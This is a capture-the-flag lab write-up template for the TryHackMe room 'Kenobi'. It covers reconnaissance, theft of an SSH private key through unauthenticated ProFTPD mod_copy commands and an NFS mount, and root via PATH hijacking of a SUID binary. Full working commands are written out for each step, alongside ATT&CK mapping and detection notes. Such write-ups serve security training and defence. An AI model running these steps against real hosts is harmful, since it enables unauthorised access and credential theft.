# Kenobi — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Linux host running a vulnerable **ProFTPD 1.3.5**, an exposed **Samba** share, and an NFS export.
The chain abuses ProFTPD's `mod_copy` to stage an SSH key into an NFS-mounted path, gains a foothold
over SSH, then escalates to root via a **SUID binary with an unsafe `PATH`** dependency. Teaches
service-chaining and SUID/PATH privilege escalation.

## Key vulnerability class

- **Foothold:** ProFTPD **1.3.5 `mod_copy`** arbitrary file copy — **CVE-2015-3306** (the
  `SITE CPFR`/`CPTO` commands allow copying files without authentication). *Verify CVE when citing.*
- **Privesc:** insecure **SUID** binary (`/usr/bin/menu`) that calls system utilities **by relative
  name**, exploitable via **`PATH` manipulation** (CWE-426 Untrusted Search Path / CWE-732 weak
  permissions).
- **Enabler:** **NFS** export and Samba misconfiguration exposing file paths.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/kenobi 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21/tcp | ftp | ProFTPD 1.3.5 | **Foothold — mod_copy** |
| 22/tcp | ssh | OpenSSH | Login path after key theft |
| 80/tcp | http | Apache | Web surface (enumerate) |
| 111/tcp | rpcbind | — | Maps to NFS (2049) |
| 139/445 tcp | smb | Samba | Share enumeration / path disclosure |
| 2049/tcp | nfs | — | **The staging target** |

[Paste trimmed scan output on completion.]

## 2. Enumeration

```
# Samba shares + NSE
nmap --script "smb-enum-shares,smb-enum-users" -p139,445 10.x.x.x
smbclient -L //10.x.x.x/ -N
smbclient //10.x.x.x/anonymous -N        # read any world-readable share

# NFS exports
showmount -e 10.x.x.x
```

- The Samba share commonly leaks a file path / config hint pointing at the user's home and the
  location of the SSH private key.
- `showmount -e` reveals a **writable / mountable NFS export** (e.g. `/var`) — this is where the
  `mod_copy` step will drop the key. [Record share listing + export path on completion.]

## 3. Exploitation

**Step A — copy the SSH private key with ProFTPD `mod_copy` (unauthenticated):**

```
nc 10.x.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa            # CPTO target must sit under the NFS-exported path
```

**Step B — mount the NFS export and retrieve the key:**

```
mkdir /mnt/kenobiNFS
mount -t nfs 10.x.x.x:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
```

**Step C — log in over SSH with the stolen key:**

```
ssh -i id_rsa kenobi@10.x.x.x
```

- **User flag:** `[capture on completion]`

## 4. Privilege escalation

```
find / -perm -4000 2>/dev/null        # SUID hunt → /usr/bin/menu
strings /usr/bin/menu                 # shows it calls e.g. `curl`/`ifconfig` by RELATIVE name
```

- `/usr/bin/menu` is SUID-root and invokes system binaries by **relative name**, so a hijacked
  `PATH` makes it run attacker code as root:

```
cd /tmp
echo '/bin/sh' > curl                 # fake the binary the SUID program calls
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu                         # choose the option that triggers `curl` → root shell
```

- **Root flag:** `[capture on completion]`

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Enumeration | `nmap` NSE (`smb-enum-*`, `nfs-*`), `smbclient`, `showmount` |
| Exploitation | `nc`/FTP client for `mod_copy` `SITE CPFR/CPTO`; `mount -t nfs`; `ssh -i` |
| Privilege escalation | `find / -perm -4000`, `strings`, `PATH` hijack, GTFOBins reference |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Unsecured Credentials: Private Keys | T1552.004 |
| Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Hijack Execution Flow: Path Interception | T1574.007 |
| Privilege Escalation | Abuse Elevation Control: Setuid/Setgid | T1548.001 |

## 7. Key learnings

- **Service chaining** — no single bug was sufficient; the solve came from combining mod_copy + NFS
  + SSH. Enumerate *all* services and think about how they connect.
- **`CPTO` must target the NFS path** — the whole trick is copying the key to a location you can
  then mount and read; getting the destination wrong is the usual stall point.
- **SUID + relative command = privesc** — always `strings`/`ltrace` a SUID binary to see what it
  calls and whether it trusts `PATH`. Classic, recurring real-world misconfiguration.
- **`showmount -e` is cheap and high-value** — exposed NFS exports are an easy win and easy to miss.
- **Blue-team transfer:** detect via anomalous FTP `SITE CPFR/CPTO` commands, unexpected NFS mounts,
  and SUID execution with a tampered environment.

## 8. References

- ProFTPD mod_copy CVE-2015-3306 (verify scope before citing).
- GTFOBins — SUID / PATH-interception abuse patterns.
